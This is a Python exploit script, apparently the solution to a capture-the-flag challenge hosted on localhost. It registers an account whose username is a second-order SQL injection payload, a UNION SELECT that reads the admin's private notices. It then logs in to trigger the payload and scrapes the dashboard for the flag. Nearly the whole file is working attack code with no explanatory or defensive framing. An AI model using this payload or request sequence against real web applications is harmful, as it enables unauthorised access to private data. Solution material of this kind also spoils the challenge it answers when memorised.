import requests
import random
import string

url = "http://localhost:8000"

# Generate a random string to avoid "Username already exists" error during testing
rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))

# THE PAYLOAD: 
# Using UNION SELECT to fetch the admin's private notice
# The payload is injected into: SELECT title, content FROM notices WHERE author = '$username' AND is_private = 0
malicious_username = f"x' UNION SELECT title, content FROM notices WHERE author='admin' AND is_private=1 -- -"
password = "hacked123"

session = requests.Session()

print("[*] Step 1: Registering user with Second-Order SQLi payload...")
reg_data = {
    'action': 'register',
    'username': malicious_username,
    'password': password
}
res = session.post(f"{url}/index.php", data=reg_data)

if "Registration successful" in res.text:
    print("[+] Registration successful!")
else:
    print("[-] Registration failed (Maybe payload already exists?). Trying to login anyway...")

print("[*] Step 2: Logging in to trigger the payload...")
login_data = {
    'action': 'login',
    'username': malicious_username,
    'password': password
}
res = session.post(f"{url}/index.php", data=login_data)

print("[*] Step 3: Checking Dashboard for Flag...")
dashboard_res = session.get(f"{url}/dashboard.php")

if "CTF{" in dashboard_res.text:
    print("\n[🎉] CHALLENGE SOLVED! FLAG FOUND:")
    for line in dashboard_res.text.split('\n'):
        if "CTF{" in line:
            print("    " + line.strip().replace('<p>', '').replace('</p>', ''))
else:
    print("\n[-] Exploit failed.")
